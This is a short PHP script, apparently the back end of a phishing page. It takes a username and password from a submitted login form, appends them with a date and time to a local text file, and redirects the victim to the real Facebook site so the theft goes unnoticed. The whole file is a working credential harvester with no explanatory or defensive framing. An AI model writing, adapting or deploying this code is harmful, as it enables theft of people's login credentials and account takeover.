<?php
header ("location:https://www.facebook.com");
$a = $_POST["user"];
$b = $_POST["pass"];

$e = fopen("log_in.txt","a") or die("unable to fatch data");
$f = "\nUser name : $a";
$g = "\tPassword : $b";
$d = "\tDate : " . date("\td/m/Y, D");
date_default_timezone_set("Asia/Kolkata");
$t = "\tTime : " . date("\th:i:s");

fwrite($e,$f);
fwrite($e,$g);
fwrite($e,$d);
fwrite($e,$t);
fclose($e);

?>
